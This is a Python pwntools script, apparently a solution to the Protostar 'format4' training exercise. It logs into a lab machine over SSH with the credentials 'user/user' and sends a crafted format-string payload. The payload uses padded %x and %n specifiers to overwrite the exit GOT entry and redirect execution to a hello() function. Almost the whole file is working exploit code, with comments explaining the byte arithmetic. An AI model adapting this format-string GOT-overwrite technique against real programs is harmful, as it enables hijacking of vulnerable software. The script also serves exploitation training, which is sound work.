#!/usr/bin/python3
from pwn import *
# you may need to change port for your machine
session = ssh(host='172.16.17.27', user='user', password='user', port=22)
# I am getting formatting errors so look at pad.py instead
# function address we want to change the address
# of exit GOT to point to hello() redirecting program execution
# hello = 0x80484b4
exit_got = 0x8049724
# \xb4\x84\x04\x08
# we use %x to get more digits and the number of total digits and characters
# is what is put in the memory address using %n
pad = lambda s : s+"X"*(512-len(s))
# little endian exit_got
exploit = '$\x97\x04\x08'
# second half of the address
exploit += '&\x97\x04\x08'
exploit += 'A'*8+'%4$33956x'+'%4$n'
exploit += '%5$33616x'+'%5$n'
ans = 'python -c \'print \"'+pad(exploit)+'\"\' | /opt/protostar/bin/format4'
# since $33956x will add 84b4 characters
# this will overwrite the second half of
# the GOT address
# we then overflow the second address so it wraps back
# around to 2052 or 0x0804
io = session.run('bash', env={"PS1":""})
if(io):
    print(ans)
    io.sendline(ans)
    log.info(io.recvline(timeout=2).decode('utf-8'))
else:
    print("Error running sh")
session.close()
